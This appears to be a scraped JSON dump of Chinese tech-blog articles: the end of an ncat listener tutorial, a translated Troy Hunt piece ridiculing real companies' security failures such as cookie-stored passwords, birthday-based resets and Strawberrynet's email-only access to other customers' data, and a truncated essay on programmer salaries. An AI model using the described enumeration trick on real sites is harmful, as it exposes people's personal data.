class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ ncat -l -k 8080</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6354523a4c4047933229-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6354523a4c4047933229-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">ncat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">l</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8080</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>现在即使来自客户端的连接断了也依然会处于待命状态。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113410\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113410votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113410\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/11a48b07810c909fd0ce4f50b3b33355d43f04e2.jpg"}
{"url_object_id": "1960505fabd1be2e545f68a984679b36", "title": "我见过的那些愚蠢的安全漏洞", "url": "http://blog.jobbole.com/113343/", "create_date": "2017/12/18", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2012/05/Security-logo.jpg"], "praise_nums": 2, "comment_nums": 3, "favor_nums": 1, "tags": "IT技术,安全", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.troyhunt.com/reckon-youve-seen-some-stupid-security-things-here-hold-my-beer/\">Tony Hunt</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：知名安全技术博主 Tony Hunt 吐槽了一些正规公司、正规网站的安全漏洞：HTTP + cookie 里明文存放用户名密码；输入用户名与生日就能重设密码；密保问题；邮箱绑定个人信息等等。</p>\n<hr>\n<p>我的朋友 Lars Klint 发过这条推：「你的密码并不是独一无二的」</p>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/7cc829d3gy1fml0ubtkrdj20fj0h3q6y.jpg\" width=\"559\" height=\"615\"></p>\n<div class=\"resize-sensor\" style=\"text-align: center;\">（附图中的提示为：密码已经被 XXX 使用。请换一个。）</div>\n<p>我顺手把它<a href=\"https://twitter.com/troyhunt/status/853517036131041280\">转发</a>了出去，因为我知道还有比这更疯狂的事情。Twitter 用户没有把它当作一个<a href=\"https://www.reddit.com/r/ProgrammerHumor/comments/65l9yq/logins_should_be_unique/\">在 Reddit 上流行的笑话</a>，而是带着恐惧和指责评论它。事实上，这完全是可能的。呵呵，我看到过一些非常愚蠢的安全问题，它不仅让我相信这篇 tweet 的真实性，并且认为这非常有可能发生。你不信？来，朋友，帮我拿着啤酒，我来给你说道说道…</p>\n<h3>记住我</h3>\n<p>假设现在你想做一个“记住我”功能，就是在方框里打勾，然后下次回到网站时，已经登录的那种。<a href=\"https://www.troyhunt.com/how-to-build-and-how-not-to-build/\">这是 Black 和 Decker 的做法</a>：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2016/02/33143313image2.png\" alt=\"Black and Decker remember me feature\"></p>\n<p>是的，这是 cookie 中 Base64 编码版本的密码，每次请求时的发送其实都不安全，而且由于它没有被标记为“安全的”，整个发送过程都很自由，容易被获取。</p>\n<p>觉得这很糟糕？试试我在这一篇文章中提到的 Aussie Farmers Direct 的做法：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2016/02/33103309image91.png\" alt=\"Aussie Farmers Direct remember me feature\"></p>\n<p>看吧，这是安全的，但它仍然是一个 cookie 中的密码，并且由于它不是 HttpOnly，在网站上仍然会有 XSS 攻击的风险。那对此他们是如何回应的？这就引出了下一个话题…</p>\n<h3>企业的反应</h3>\n<p>回到 2013 年，我做了一件尽职的事情，让 Aussie Farmers 知道了上述风险。我还建议，他们不应该通过邮件发送密码（这是我最讨厌的事情之一），之后我收到了一封来自自称是“市场部经理”的人的回信：</p>\n<blockquote><p>到目前为止，我司还没有发生过，因为给新用户通过电子邮件发送密码，而引起的安全问题，而且据我所知，我本人网上注册的 90% 网站，也遵循着一样的流程。</p></blockquote>\n<p>这让我想起了国际石油和天然气公司（Oil and Gas International）的<a href=\"https://www.troyhunt.com/new-pluralsight-course-what-every-developer-must-know-about-https/\">这条评论</a>，是它在我的新 HTTPS 课程文章中给出的回复。现在当登录表单没有被安全加载时，Firefox 开始警告用户，而这让他们变得暴躁：</p>\n<blockquote><p>你方对于不安全的密码和/或登录的公告，会自动出现在本司（Oil and Gas International）的登录页面上，但并未得到我方的许可，请立即移除它。我方有自己的安全系统，并且超过 15 年来从未被攻破。你发出的公告引起了订阅者的关注，并对本司的业务造成了不良影响。</p></blockquote>\n<p>他们的网站，呃，在那之后不久就没法用了（SQL 注入风险可能没有帮到他们）。但网站现在又能用了，就是不清楚，是不是他们已经把时钟往前重置了整整 15 年。</p>\n<p>（译注：SQL Injection，即 SQL 注入，就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。）</p>\n<p>虽然我们谈论的是无关紧要的安全意见，但<a href=\"https://www.troyhunt.com/the-cobra-effect-that-is-disabling/\">英国天然气公司（British Gas）过去也遇到了一些困难</a>：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/1b1b00021015034ad420c21850dca58d.jpg\"></p>\n<blockquote><p>（内容：@BritishGasHelp 不允许粘贴对于密码管理不是一个有效的举措，完全没有必要，而且很危险！</p>\n<p>@passy 如果我们允许用户粘贴，我们将失去安全证书，这会让我们置身在暴力破解的危险中，不管怎样，谢谢你的提醒~ Steve）</p></blockquote>\n<p>当我们身处世界的一角时，很难忽视 <a href=\"https://www.troyhunt.com/lessons-in-website-security-anti/\">Twitter 上像乐购（Tesco）这种大企业偶尔精神错乱的例子</a> ：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2016/02/46624661SNAGHTML3928683.png\" alt=\"Tesco: Passwords are stored in a secure way. They're only copied into plain test when pasted automatically into a password reminder email.\"></p>\n<blockquote><p>（@troyhunt 请不要担心，您的密码正被安全地存储，它只在密码提醒邮件中显示，供您进行粘贴操作）</p></blockquote>\n<p>但是，你会说“嘿，安全密码重置很难！”不尽然，看看这个…</p>\n<h3>密码重置</h3>\n<p>一切是这样开始的：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/1a43f438d531818f5b2cffdb0fa57f2c.jpg\"></p>\n<blockquote><p>（内容：@BetfairHelpdesk 那些使用用户名和生日登录的人，是不是应该都应该改改他们的密码？）</p></blockquote>\n<p>你原本可能会想:“哦，你的用户名是电子邮件地址，然后 Betfair 给你发了一封电子邮件，而你通过其中包含的特殊链接就能重置密码”，但现在你知道了，这种想法太想当然了。出乎意料的是，Betfair 实际上并没有相信 Paul 的说法，所以我做了个视频来解释一切。</p>\n<p style=\"text-align: center;\">【视频】：https://youtu.be/YjBBmfovL08</p>\n<p>这是听上去的样子：如果你知道某人的电子邮件地址和生日，你就可以任意重置他的密码。但是，在双方交流的过程中，一定是哪里出错了，导致 Betfair 板起脸来，“好心地”提醒 Paul，如果他把电子邮件地址和生日告诉其他人，就违反了他们的条款。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/6cb8ed87a72a2c91d63e7dcebeb1c137.jpg\"></p>\n<blockquote><p>（内容：@BetfairHelpdesk 你似乎是在回避问题：只需要用户名和生日就能更改密码，是这样的吗？</p>\n<p>@psawers 是的，但是如果你告诉了别人这个信息，就违反了我们的条款）</p></blockquote>\n<p>你知道他们真正需要的是什么吗？安全问题…</p>\n<h3>安全问题</h3>\n<p>我在这儿举个例子：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/0aac9096a80678c521e0d19d5aa202a6.jpg\"></p>\n<blockquote>\n<div class=\"resize-sensor\">（内容：这是我见过的最糟糕的安全问题）</div>\n</blockquote>\n<p>什么？这个太一般了？那么试试这个：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/524a1868012d2bbd4a569771ca92f8f8.jpg\"></p>\n<blockquote><p>我刚刚上的一个网站，它有个这样的安全问题：你祖母家的狗叫什么？</p>\n<p>&amp;*#￥*&amp;(*%^$</p></blockquote>\n<p>这些安全问题真是疯了！我是说，这都是怎么想的？总体而言，要么采取不变的数据，比如你母亲的姓，或者可枚举的问题，比如你第一辆车的样子、你最喜欢的电影…在本文中，安全问题应该获得一席之地！现在让我们看看一些更为理智的东西…</p>\n<h3>登录</h3>\n<p>你知道登录过程中最难的一步是什么？密码。要是有更简单的方法就好了：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/f571151e630277bdcb65879ffbbe1b30.jpg\"></p>\n<blockquote><p>（内容：呃…玩真的吗？这简直蠢到了一种新高度）</p></blockquote>\n<p>你可能会想“它只是一条 tweet，不一定是真的”，但你错了，它就是真的，这是<a href=\"https://web-beta.archive.org/web/20150117203933/mysmsdiary.co.uk\"> archive.org 的快照</a>：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2017/04/My-SMS-Diary-Logon.png\" alt=\"My SMS Diary Logon\"></p>\n<blockquote><p>（内容：输入手机号和密码快速登录，密码默认是手机号后四位）</p></blockquote>\n<p>在我们精神失常，说出“密码必须消失”这种话之前，还是要冷静一下，毕竟还没有人知道如何做到这一点！此外还有很多有帮助的技术解决方案，但没人真正想要使用它们，而事实是，为了规避技术问题，我们反而设置了更多的密码。但是，我还看到过更糟糕的…</p>\n<h3>物理安全</h3>\n<p>我觉得我找不到比这更荒谬的例子了，所以我把它放在这儿：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2017/04/virus-noises.jpg\" alt=\"Anti-virus protection in HDMI cable\"></p>\n<blockquote><p>（内容：“100％ 聚酯薄膜”双屏蔽 1.3c 级电缆，具有抗病毒保护功能，可减少病毒噪音，并获得完美的图像传输。）</p></blockquote>\n<p>你知道真正让我恼火的是什么吗？想想你那些不懂技术的朋友和亲戚，他们为了让 DVD 播放机与电视机一起工作，走进商店拿起两根 HDMI 线缆，然后翻到盒子背面，开始比较产品规格。当看到其中一根有抗病毒保护，而另一个根没有，你认为他们会选择哪根? ！</p>\n<p>现在，还有一件事…</p>\n<h3>账户枚举</h3>\n<p>我想把“最好的”东西留到最后讲。说它是最好的，是因为它仍然是一个随处可见、愚蠢的安全问，尽管愚蠢，但至少人们正在积极修复它：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2017/05/f816f8379042be1b8b0bae5b022c63f5.jpg\"></p>\n<blockquote><p>（内容：我们马上要更换登录系统了，但同时，用户仍然可以使用我们的快速结账功能，敬请期待~）</p></blockquote>\n<p>这是距离本文八个月前的事了，那么这个愚蠢的安全问题究竟是什么？想象一下：你前往 <a href=\"https://strawberrynet.com/\">Strawberrynet</a>，扔掉了购物车里的一些香薰、爽肤水或其他什么，然后点击结账按钮。呈现在你面前的是：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2016/08/Checkout-1.png\" alt=\"Strawberrynet Checkout\"></p>\n<blockquote><p>（内容：请输入电子邮箱地址以结账）</p></blockquote>\n<p>你需要输入电子邮件地址，可以是网站上的任何邮件地址，之后，你就可以看到他人的个人资料了：</p>\n<p><img src=\"https://www.troyhunt.com/content/images/2016/08/Personal-details-shown-1.png\" alt=\"Strawberrynet disclosing other people's data\"></p>\n<p>等等，这是什么鬼？！这是因为他们将个人数据与系统上的电子邮件地址进行了捆绑。而且由于这是<a href=\"http://www.alexa.com/siteinfo/strawberrynet.com\">世界上（访问量）最大的五千个网站之一</a>，每天有许多人打开浏览，从而在网站中留下了很多的数据。你可以输入一个女性的名字（网站主要卖化妆品）再加上一个常见的电子邮箱后缀，之后就是惊喜啦！如果你认为这有点可怕，呵呵，这实际上正是网站的一个特色：</p>\n<blockquote><p>请注意，经过我们的调查，绝大多数用户都喜欢我们这个“不带密码”的系统。使用您的电子邮件地址作为密码已经足够安全了。</p></blockquote>\n<p>才怪，这根本不安全！我在八月写了篇列举<a href=\"https://www.troyhunt.com/website-enumeration-insanity-how-our-personal-data-is-leaked/\">网站精神错乱的文章</a>，其中提到了他们早期的 tweet，但他们似乎完全无视这个问题。我甚至创建了一个帐户来检测它的工作原理：</p>\n<p><img src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fml1we5rn5g20p007ogxo.gif\" alt=\"Marquee FTW!\"></p>\n<p>好吧，我想我还需要再喝杯啤酒…</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113343\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113343votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113343\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2016/09/9667abaa540914200edd449974fb5538.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            I'm OUT, never IN.        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/zhj318\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/zhj318/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/zhj318/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 48</a> · <a title=\"QQ：574375911\" target=\"_blank\" href=\"#\"><i class=\"fa fa-qq\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/1ef0c99044632a162ca37b8246f9136048574deb.jpg"}
{"url_object_id": "eb6cc8fd6536dae6eac7ae49fc72211b", "title": "谈谈程序员的离职和跳槽", "url": "http://blog.jobbole.com/112809/", "create_date": "2017/12/09", "front_img_url": ["http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg"], "praise_nums": 1, "comment_nums": 9, "favor_nums": 7, "tags": "职场,职场,跳槽", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/JimmyZhang/archive/2012/11/21/2781035.html\">张子阳</a>   </div><p>// 伯乐在线转注：原文写于 2012 年</p>\n<p>这篇文章是我在部门会议上一次发言的总结。之所以会有这次会议，是因为我的一名员工向我提出了辞职，在思索了几天后，我整理了一下自己的思路，于是便有了这次的会议和现在的这篇文章。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://ww1.sinaimg.cn/mw690/7cc829d3gw1eizj4ql2huj20eq0b0wfx.jpg\" width=\"530\" height=\"396\"></p>\n<p style=\"text-align: center;\">（转载配图）</p>\n<h3>收入是由什么决定的？</h3>\n<p>这位员工辞职的原因主要有两个：</p>\n<ol>\n<li>公司的薪水无法达到他的预期，未来一年在公司的收入前景也不是很明确。</li>\n<li>想要去做更底层的开发，方向是使用C/C++开发3D图形图像。而我们公司主要是.NET开发。</li>\n</ol>\n<p>既然其中的一个原因是薪水无法符合预期，那么首先要搞清楚的就是收入是由什么决定的。</p>\n<h3>1.积累</h3>\n<p>首先要说的一点就是：积累。积累就是你在这家公司所创造的价值的积累。</p>\n<p>你今天所领的薪水，并不是由你现在所创造的价值所决定的，而是包含了以前一段时期内其他同事所创造的价值。举个例子来说，公司目前排名前三的大客户：客户A、客户B、客户C。</p>\n<ol>\n<li>客户A是2008年接下来的，现在每年为公司贡献600万。</li>\n<li>客户B是2009年接下来的，现在每年为公司贡献500万。</li>\n<li>客户C是2010年接下来的，现在每年为公司贡献350万。</li>\n</ol>\n<p>我的年薪是你的两倍还多。可我也承认，我现在所能创造的价值，和我的能力绝对不可能是你的两倍。可问题是：2008年、2009年、2010年这些年份我都在公司，上面的每一个大客户，都有我的贡献。而你2012年才新进公司，你并没有之前的积累。所以，新员工入职后，工资相较老员工会低一些是正常的。很多新员工总是认为自己的收入低了，吃亏了，实际上，很多情况下，新员工在加入公司的头一年，公司仅能维持平衡，即新员工创造的价值全当工资发给他了。直到第二年，有了上一年的积累之后，公司才有所盈余。而加入半年就离职的员工，对公司来说基本上是亏本的。这也就解释了为什么人员流动特别快的公司活不长，因为人力成本太高。</p>\n<p>关于积累，我可以再举几个例子说明一下：</p>\n<blockquote><p>洪小莲，李嘉诚的秘书，几十年来一直追随李嘉诚，她从几千元的工薪族，做到身家上亿的工薪族，享受的是公司成长的回报。这种回报并非是她个人的学识和能力有了大幅的提高而得到的等价交换，很大程度上仅仅是因为她忠诚地待在这趟车上。</p>\n<p>杨元庆，联想现在的CEO，研究生毕业后就一直追随柳传志，尽管一开始从事的是他并不很乐意的销售工作，但最终还是坚持了下来。上一次注意到他，是看到一则新闻，标题是“杨元庆自掏2000万奖励一线员工”。</p></blockquote>\n<p>上面只是正面的例子，也有反面的例子：</p>\n<blockquote><p>吴士宏，曾写了一本书叫做《逆风飞扬》，可谓是红极一时。1986年进入IBM，1998年离开IBM，进入微软，担任微软中国公司总经理，1999年进入TCL，2002年离开TCL。之后就离开了公众的视线。我特意去百度搜索“吴士宏现在在哪里”，没有任何的消息。我想如果她很成功的话，一定还属于“公众人物”，不至于连度娘都不知去向。</p></blockquote>\n<p>跳槽的话显然就要放弃先前的积累。比方说，当你跳槽到另一家公司以后，你曾经做过的系统、曾经服务过的客户仍然在为先前的公司创造着利润，可是跟你已经一毛钱关系都没有了（极少数公司有股票，另当别论）。所以跳槽之前要慎重考虑，跳得不好，有可能越跳越低。</p>\n<p>既然新员工相对于老员工来说，收入低一些是正常的，那么老员工工资高也是合情合理的。但是有一些公司，我将其归为“无良公司”，它们会在老员工的收入高到一定程度的时候，将老员工砍掉，然后再招募低廉的新人来承担之前老员工的工作，以赚取更高的利润。我觉得这些都是小聪明，最后的结果就是，聪明能干一些的人，在看出公司的这些伎俩之后果断离职；能力一般的员工，也会把你这里当成培训基地，翅膀硬了就飞了，受损的最后还是公司，实在是得不偿失。还不如厚待老员工，也让新进的员工对未来有一个更好的预期。也有一些人向我抱怨说：“老员工待得久了，干劲都被磨光了，每天都是混日子，还不如新员工，不开他开谁？”。然后我反问他：“激励员工难道不正是你工作的一部分吗？”。这种情况的出现，更多时候，是管理者的责任，而非员工。</p>\n<p>最后补充一点：我并不认为老员工工资比新员工高就一定是合理的。当公司对一个新员工开出很高的工资时，其实是出于这样一种期望：他能推动公司进步的更快。而如果他真的这样做到了，公司进步的更快了、收益更高了，可以反哺老员工，从而公司的整体待遇水平都提高了，不是皆大欢喜吗？可能一些老员工并不能明白这些，所以，当招一个新员工工资水平远高于现有的老员工时，为什么要这样做，最好能让老员工知晓。</p>\n<h3>2.老板</h3>\n<p>这个“老板”是宽泛的老板，不一定是公司最大的老板。有的时候，公司比较大，你的职位又比较低，大老板连有没有你这个人都不知道，此时的老板就是你的顶头上司。很多时候，你的收入与他也有着莫大的关系。</p>\n<p>对于我来说，我的原则是：在我的能力范围内，我会为我的员工争取更好的待遇。表面上看，这样做很蠢，花6000块就能雇到一个人，为什么要花8000块？我不是这样认为的，我期望能和我的员工形成这样一种互动：我尽我的能力为你争取好的待遇，你也尽你的努力做好工作。</p>\n<p>我不能要求员工“你先把工作做好，我自然会给你好的待遇”。总是要有人先迈出一步，总是要有一方先信任另一方，所以在你什么还没有做的时候，我就先信任你，并且给你尽可能好的待遇，那么我该做的事情都做了，我问心无愧，剩下的，就看你的表现了。</p>\n<p>可能有人会想，都这样了怎么还会有人提出辞职？实际上，提出辞职的是一个毕业刚一年的小伙子，1989年生，毕业1年多，我给他的待遇是试用期9000，转正后9500。在给他这个待遇之前，我是进行过一些调研的，我打电话给我的一个表妹，她是西安电子科技大学的研究生（陕西省排名第三的学校，211院校），她和她的同学在今年毕业找工作的时候，多得是6000到8000的工资。所以从这方面来说，我并没有亏待你，而你要求12K的工资，我并不是不愿意给这么多，你的表现也说明了你是个很有潜力的人才。只是受经济环境的影响，今年公司的效益不及往年，要在一定程度上节省开支。其次，你让其他的老员工情何以堪？所以，综合起来，你的要求超出了我的能力范围之外，我无法开口向公司申请提高你的薪水。</p>\n<h3>3.门槛</h3>\n<p>除了积累和顶头上司两个决定因素以外，第三个决定因素就是你从事工作的门槛。为什么餐厅服务员的收入很低？为什么坐在前台收发快递的文员收入很低？因为这些工作的门槛很低，门槛低就意味着你不做有的是人能做，你不做有大批的“后备队伍”在等着做。由于庞大的后备队伍的竞争，你就无法提高自己的要价。而提升自己所从事工作的门槛，实际上就缩减了竞争者的规模。</p>\n<p>程序开发也是一样。如果你想收入高，你就做一些别人做不了，又有市场的。</p>\n<p>.NET在程序开发中就属于门槛比较低的一类。个中原因我想大家都懂的，就不在这里赘述了。做.NET不需要你科班出身，或许一点兴趣再加上一点时间，或许一个类似北大青鸟的培训，都可以让你开始从事.NET开发了。你可以不懂指针、不懂数据结构、不懂算法、不懂汇编、不懂很多东西，但照样可以做出一个.NET程序来。而这些人往往又是对薪资的要求没那么高的，这样无形中就拉低了.NET程序员的“身价”。.NET的易学易会，很大程度上是由于它的封装性比较好。底层的东西都屏蔽掉了，你只要知道学习一下命名空间，然后寻找相关的API去调用就好了。记得我们公司曾经开发过一个基于C语言的手持设备程序，没有任何的类库支持，连排序、链表这样.NET中的基本功能，都要自己来实现，更别提内存管理和程序逻辑了，和.NET比起来，门槛就相对高一些了。</p>\n<p>所以，如果想收入高一些，那么就去做更高难度的技术工作，这里随便想了几个例子：</p>\n<ul>\n<li>百度、谷歌的搜索引擎算法。</li>\n<li>微软、谷歌、苹果的操作系统。</li>\n<li>网络游戏，例如《征途》的游戏引擎。</li>\n<li>大型企业的ERP，比方说SAP。</li>\n<li>软硬结合，比如单片机，电气自动化。</li>\n<li>以及我这位即将离职的同事说的，3D图形图像。</li>\n</ul>\n<p>所以，从这个角度来看，这位同事的辞职是明智的，他很年轻，有的是机会重新选择自己的道路，所以我也祝愿他能有更好的发展。而这些好赚的钱，就留给我们来做了:-)。</p>\n<h3>4.平台</h3>\n<p>接下来要说的一个决定因素是平台。很多程序员觉得30岁就瓶颈了，30岁写程序就到头了，实际上，这只是你的平台比较小罢了。就拿我自己的公司来说，平台就不大，只要是踏踏实实工作过5年的程序员，基本上就能够胜任公司90%的技术工作了，剩下的10%，请教一下其他同事，进行一下技术交流，也完全能够解决。这样就存在一个问题：随着你年龄的增长，你的生活压力越来越大，要求越来越高，可是公司只要5年经验的程序员就够用了。假设市场上5年经验的程序员的平均要求是10K，凭什么要给你15K？你的优势在哪里？如果你没有突破，就会有“30岁写程序就到头了”的感觉。</p>\n<p>而如果平台大一些情况就会不一样，比方说，你去了IBM，可能5年的经验不过刚刚入门而已。IBM有一个工程院，其中有5位院士（IBM Fellow）获得过诺贝尔奖，很多人钻研技术都超过20年或者更久。如果你对技术感兴趣，并执着去钻研的话，你可以不断地去挑战和攀登。</p>\n<p>当然，你可能没那么好的运气和实力进入IBM，那么其他一些中型的平台也是不错的，比方说阿里巴巴、金蝶、百度、腾讯等等。在这里，至少你有足够的理由和需要再去进行深入学习。因为在这些地方，5年的经验是远远不够的，还需要进一步地学习和努力。</p>\n<p>如果你和我一样，不巧没有那么大的平台，此时的选择大概有这么几种：</p>\n<p>1. 你可以凭借你在公司的积累（第一节讲过的），过比较安逸的日子。如果比较幸运，押对了宝，公司发展得比较好，收入一样会变得非常可观；如果比较不幸，公司经营的状况不好，那就要承担比较大的风险了。说得难听一点，公司倒闭了你去哪里？你过去的积累已经一文不值，而你的年龄已经35，水平却相当于只有5年经验。你的竞争力在哪里？</p>\n<p>2. 你可以凭自己的努力将现在所在的平台做大，换言之，把自己的小公司做大。这当然是比较积极的做法，也是我一直努力的方向。现在你看到的大公司，不也是从小公司一步一步做起的吗？不过这里还有两个问题：1、有的时候，你的力量在公司中的占比没那么大，你再怎么努力推进的速度也还是有限；2、你缺乏慧眼，选中的公司本身就缺乏长大的资质。我们往往只看到成功了的公司，却忽视了更多在竞争中倒下的公司。</p>\n<p>3. 